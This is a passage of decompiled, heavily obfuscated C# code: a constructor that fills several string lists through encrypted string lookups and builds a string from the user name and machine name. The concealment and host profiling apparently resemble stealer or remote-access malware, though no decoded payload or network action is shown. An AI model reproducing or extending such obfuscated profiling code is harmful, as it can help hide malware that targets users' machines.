			sZXTHnjVRHJHh(getString_0(107388060)),
			sZXTHnjVRHJHh(getString_0(107382731)),
			sZXTHnjVRHJHh(getString_0(107382674)),
			sZXTHnjVRHJHh(getString_0(107382633)),
			sZXTHnjVRHJHh(getString_0(107382108)),
			sZXTHnjVRHJHh(getString_0(107382035)),
			sZXTHnjVRHJHh(getString_0(107382022)),
			sZXTHnjVRHJHh(getString_0(107381929)),
			sZXTHnjVRHJHh(getString_0(107381880)),
			sZXTHnjVRHJHh(getString_0(107382375)),
			sZXTHnjVRHJHh(getString_0(107382286)),
			sZXTHnjVRHJHh(getString_0(107382229)),
			sZXTHnjVRHJHh(getString_0(107382216)),
			sZXTHnjVRHJHh(getString_0(107382175)),
			sZXTHnjVRHJHh(getString_0(107381606)),
			sZXTHnjVRHJHh(getString_0(107388515)),
			sZXTHnjVRHJHh(getString_0(107381533)),
			sZXTHnjVRHJHh(getString_0(107381504)),
			sZXTHnjVRHJHh(getString_0(107381471)),
			sZXTHnjVRHJHh(getString_0(107381398)),
			sZXTHnjVRHJHh(getString_0(107381401)),
			sZXTHnjVRHJHh(getString_0(107388077)),
			sZXTHnjVRHJHh(getString_0(107381840)),
			sZXTHnjVRHJHh(getString_0(107381823)),
			sZXTHnjVRHJHh(getString_0(107381794)),
			sZXTHnjVRHJHh(getString_0(107386856)),
			sZXTHnjVRHJHh(getString_0(107381761)),
			sZXTHnjVRHJHh(getString_0(107381794)),
			sZXTHnjVRHJHh(getString_0(107381732)),
			sZXTHnjVRHJHh(getString_0(107381703)),
			sZXTHnjVRHJHh(getString_0(107381642)),
			sZXTHnjVRHJHh(getString_0(107381625)),
			sZXTHnjVRHJHh(getString_0(107381064)),
			sZXTHnjVRHJHh(getString_0(107381023)),
			sZXTHnjVRHJHh(getString_0(107380962)),
			sZXTHnjVRHJHh(getString_0(107380933)),
			sZXTHnjVRHJHh(getString_0(107380892)),
			sZXTHnjVRHJHh(getString_0(107381327)),
			sZXTHnjVRHJHh(getString_0(107381314)),
			sZXTHnjVRHJHh(getString_0(107381281)),
			sZXTHnjVRHJHh(getString_0(107381224)),
			sZXTHnjVRHJHh(getString_0(107381179)),
			sZXTHnjVRHJHh(getString_0(107381122)),
			sZXTHnjVRHJHh(getString_0(107413345)),
			sZXTHnjVRHJHh(getString_0(107413272)),
			sZXTHnjVRHJHh(getString_0(107413275)),
			sZXTHnjVRHJHh(getString_0(107413214)),
			sZXTHnjVRHJHh(getString_0(107413181)),
			sZXTHnjVRHJHh(getString_0(107413124)),
			sZXTHnjVRHJHh(getString_0(107413595)),
			sZXTHnjVRHJHh(getString_0(107413514)),
			sZXTHnjVRHJHh(getString_0(107413481)),
			sZXTHnjVRHJHh(getString_0(107413432)),
			sZXTHnjVRHJHh(getString_0(107413387)),
			sZXTHnjVRHJHh(getString_0(107413370)),
			sZXTHnjVRHJHh(getString_0(107412781)),
			sZXTHnjVRHJHh(getString_0(107412764)),
			sZXTHnjVRHJHh(getString_0(107412731)),
			sZXTHnjVRHJHh(getString_0(107412658)),
			sZXTHnjVRHJHh(getString_0(107412617)),
			sZXTHnjVRHJHh(getString_0(107412604)),
			sZXTHnjVRHJHh(getString_0(107383061)),
			sZXTHnjVRHJHh(getString_0(107413083)),
			sZXTHnjVRHJHh(getString_0(107413010)),
			sZXTHnjVRHJHh(getString_0(107412985)),
			sZXTHnjVRHJHh(getString_0(107412956)),
			sZXTHnjVRHJHh(getString_0(107412923)),
			sZXTHnjVRHJHh(getString_0(107412890)),
			sZXTHnjVRHJHh(getString_0(107412297)),
			sZXTHnjVRHJHh(getString_0(107412268)),
			sZXTHnjVRHJHh(getString_0(107412255)),
			sZXTHnjVRHJHh(getString_0(107412178)),
			sZXTHnjVRHJHh(getString_0(107412137)),
			sZXTHnjVRHJHh(getString_0(107412080)),
			sZXTHnjVRHJHh(getString_0(107412575)),
			sZXTHnjVRHJHh(getString_0(107412546)),
			sZXTHnjVRHJHh(getString_0(107412469))
		};
		rTdBGDqcIJimSxIX = new List<string>
		{
			sZXTHnjVRHJHh(getString_0(107412428)),
			sZXTHnjVRHJHh(getString_0(107412411)),
			sZXTHnjVRHJHh(getString_0(107412330)),
			sZXTHnjVRHJHh(getString_0(107411801)),
			sZXTHnjVRHJHh(getString_0(107411752)),
			sZXTHnjVRHJHh(getString_0(107411687)),
			sZXTHnjVRHJHh(getString_0(107411610)),
			sZXTHnjVRHJHh(getString_0(107412061))
		};
		MSUPRnrxQZS = new List<string>
		{
			sZXTHnjVRHJHh(getString_0(107412004)),
			sZXTHnjVRHJHh(getString_0(107411971)),
			sZXTHnjVRHJHh(getString_0(107411894)),
			sZXTHnjVRHJHh(getString_0(107411877)),
			sZXTHnjVRHJHh(getString_0(107411844)),
			sZXTHnjVRHJHh(getString_0(107411251)),
			sZXTHnjVRHJHh(getString_0(107411238)),
			sZXTHnjVRHJHh(getString_0(107411205)),
			sZXTHnjVRHJHh(getString_0(107411172)),
			sZXTHnjVRHJHh(getString_0(107411139)),
			sZXTHnjVRHJHh(getString_0(107411106)),
			sZXTHnjVRHJHh(getString_0(107411073)),
			sZXTHnjVRHJHh(getString_0(107411512)),
			sZXTHnjVRHJHh(getString_0(107411471)),
			sZXTHnjVRHJHh(getString_0(107411458)),
			sZXTHnjVRHJHh(getString_0(107411425)),
			sZXTHnjVRHJHh(getString_0(107411352)),
			sZXTHnjVRHJHh(getString_0(107411319)),
			sZXTHnjVRHJHh(getString_0(107410766)),
			sZXTHnjVRHJHh(getString_0(107410757)),
			sZXTHnjVRHJHh(getString_0(107410724)),
			sZXTHnjVRHJHh(getString_0(107410683)),
			sZXTHnjVRHJHh(getString_0(107410650)),
			sZXTHnjVRHJHh(getString_0(107412004)),
			sZXTHnjVRHJHh(getString_0(107410577)),
			sZXTHnjVRHJHh(getString_0(107410568)),
			sZXTHnjVRHJHh(getString_0(107411035)),
			sZXTHnjVRHJHh(getString_0(107411002)),
			sZXTHnjVRHJHh(getString_0(107410929)),
			sZXTHnjVRHJHh(getString_0(107410920)),
			sZXTHnjVRHJHh(getString_0(107410887)),
			sZXTHnjVRHJHh(getString_0(107410846)),
			sZXTHnjVRHJHh(getString_0(107410261)),
			sZXTHnjVRHJHh(getString_0(107411971)),
			sZXTHnjVRHJHh(getString_0(107410220)),
			sZXTHnjVRHJHh(getString_0(107411894)),
			sZXTHnjVRHJHh(getString_0(107410187)),
			sZXTHnjVRHJHh(getString_0(107410154)),
			sZXTHnjVRHJHh(getString_0(107410145)),
			sZXTHnjVRHJHh(getString_0(107410112)),
			sZXTHnjVRHJHh(getString_0(107410039)),
			sZXTHnjVRHJHh(getString_0(107410510)),
			sZXTHnjVRHJHh(getString_0(107410477)),
			sZXTHnjVRHJHh(getString_0(107410444)),
			sZXTHnjVRHJHh(getString_0(107410435)),
			sZXTHnjVRHJHh(getString_0(107410394)),
			sZXTHnjVRHJHh(getString_0(107410321))
		};
		AaZWCpttHpB = new List<string>
		{
			sZXTHnjVRHJHh(GWbGalFEHz(getString_0(107410312))),
			sZXTHnjVRHJHh(getString_0(107409719)),
			sZXTHnjVRHJHh(getString_0(107409658)),
			sZXTHnjVRHJHh(getString_0(107409561)),
			sZXTHnjVRHJHh(getString_0(107409980)),
			sZXTHnjVRHJHh(getString_0(107409883)),
			sZXTHnjVRHJHh(getString_0(107409790)),
			sZXTHnjVRHJHh(getString_0(107409181)),
			sZXTHnjVRHJHh(getString_0(107409088)),
			sZXTHnjVRHJHh(getString_0(107409503)),
			sZXTHnjVRHJHh(getString_0(107409410)),
			sZXTHnjVRHJHh(getString_0(107409313)),
			sZXTHnjVRHJHh(getString_0(107408708)),
			sZXTHnjVRHJHh(GWbGalFEHz(getString_0(107410312)))
		};
		IquwDHMWXJfl = sZXTHnjVRHJHh(getString_0(107408611));
		vtEaPMjBqiI = new List<string>
		{
			sZXTHnjVRHJHh(getString_0(107408978)),
			sZXTHnjVRHJHh(getString_0(107408784)),
			sZXTHnjVRHJHh(getString_0(107408078)),
			sZXTHnjVRHJHh(getString_0(107408396)),
			sZXTHnjVRHJHh(getString_0(107407690)),
			sZXTHnjVRHJHh(getString_0(107407528))
		};
		fguLtySThkLVUO = new List<string>
		{
			sZXTHnjVRHJHh(getString_0(107407846)),
			sZXTHnjVRHJHh(getString_0(107407753)),
			sZXTHnjVRHJHh(getString_0(107407180))
		};
		afLnwsGiSBdAJD = getString_0(107396244);
		XHjSzuVQnUlIK = getString_0(107396244);
		gmtRJswlljT = new DateTime(2000, 1, 1);
		kukYFEXFwiSYkT = new DateTime(2100, 1, 1);
		WDFbbikzqbHCmt = getString_0(107396787);
		gxaokSriQGuW = getString_0(107389598);
		yqYtbZXdPjhAbt = getString_0(107396244);
		xHUMmLCcffeP = getString_0(107396244);
		cEKaTsnweVtt = getString_0(107396244);
		pJGfLSCuLTal = getString_0(107396787);
		qDjgFderneJ = getString_0(107396244);
		JdQhqbSZaoMfQdp = getString_0(107396244);
		nSXBpdGwvrZMVvqT = new List<string>
		{
			getString_0(107395797),
			getString_0(107396023),
			getString_0(107395831),
			getString_0(107395424)
		};
		PCTnOOIsiyb = getString_0(107396244);
		ZqUFXQYlIUOG = getString_0(107407119);
		sLngoJPKIDllNQJ = getString_0(107396244);
		cpkjXbtgFj = getString_0(107396244);
		eFSrYJmLvqzXp = getString_0(107396244);
		AFQqTJKxHbunh = string.Empty;
		pdcHQxKrrZeR = getString_0(107396244);
		DieFviToXchu = getString_0(107396244);
		xcOIRJtviOVai = getString_0(107396244);
		iNWiAeYaDzvF = getString_0(107393922);
		naWqivWRJh = getString_0(107393922);
		eDbFUVBVFI = getString_0(107396244);
		bFsJUnRDcjikGdM = getString_0(107396787);
		OkcrlmVDImyG = getString_0(107396244);
		IUHZOqJmJjWw = getString_0(107396244);
		TQnhOAYDbOiZM = getString_0(107396244);
		ncdcGKnwECcw = getString_0(107407114);
		lrWDNSELlfr = getString_0(107396244);
		yktBbrfbKqZX = getString_0(107396244);
		erFyhehuVCTLSQ = getString_0(107407129);
		iJXehZAzevnrWv = getString_0(107396244);
		ZBnpZUuEQInZ = getString_0(107396244);
		sSHYSlCKpuHjC = getString_0(107396244);
		HPbZVzfaaiUf = getString_0(107396244);
		DxZVhodwqDtHV = getString_0(107407108);
		GsbPUlfjszh = getString_0(107396787);
		UWcvBZkHIpRLlXE = getString_0(107396244);
		wXyXKPhgCjc = getString_0(107396244);
		NeuNfTmbHfaft = getString_0(107396244);
		MsFMIZIkwWWDM = new string[0];
		mANJAWVWINnm = getString_0(107396244);
		EgxLiKEDXzXg = true;
		tqhTOSvjpqL = getString_0(107396244);
		dTyBwXiyZmm = false;
		brAfHWSzDbgM = false;
		tulEWCZoBjriFo = false;
		MjeZXFRTbmVvWAYY = false;
		CaiUUOOprZSOI = getString_0(107407063);
		CWJvOLeqgyddlcWAG = false;
		sKXLpqJtDm = false;
		KZguPWiaCOq = false;
		kTvNgjuGRAjhCBkP = false;
		IiEkQrvmRIR = true;
		UpWeGYvBeGdKKPF = getString_0(107407074) + Environment.UserName + getString_0(107407029) + Environment.MachineName + getString_0(107407040) + fSyEEKEvmFT.nMrSkKEDtWhjtyXS() + getString_0(107407035);
		aODoRHZYWeVax = new List<string>();
		AnAXKtORlBOx = new List<string>();
		AuviPSoWvgcSRp = new List<string>();
	}
}
